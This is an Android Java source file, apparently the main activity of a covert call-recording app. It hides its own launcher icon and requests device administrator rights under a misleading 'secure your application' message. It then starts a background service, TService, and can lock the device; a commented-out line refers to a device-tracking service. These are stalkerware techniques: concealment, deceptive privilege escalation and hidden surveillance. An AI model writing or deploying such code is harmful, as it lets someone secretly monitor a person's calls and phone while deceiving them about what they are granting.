package app.test.com.recordcall;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.support.design.widget.FloatingActionButton;
import android.support.design.widget.Snackbar;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.view.View;
import android.view.Menu;
import android.view.MenuItem;

public class MainActivity extends AppCompatActivity {

        public static final int REQUEST_CODE = 5912;

        @Override
        protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            PackageManager p = getPackageManager();
            ComponentName componentName = new ComponentName(this, MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
            p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
            try {
                // Initiate DevicePolicyManager.
                DevicePolicyManager mDPM = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
                ComponentName mAdminName = new ComponentName(this, DeviceAdminDemo.class);

                if (!mDPM.isAdminActive(mAdminName)) {
                    Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                    intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, mAdminName);
                    intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Click on Activate button to secure your application.");
                    startActivityForResult(intent, REQUEST_CODE);
                } else {
                    mDPM.lockNow();
                    finish();
//                 Intent intent = new Intent(MainActivity.this,
//                 TrackDeviceService.class);
//                 startService(intent);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        @Override
        protected void onActivityResult(int requestCode, int resultCode, Intent data) {
            if (REQUEST_CODE == requestCode) {
                startService(new Intent(MainActivity.this, TService.class));
                finish();
            }
            super.onActivityResult(requestCode, resultCode, data);
        }
}
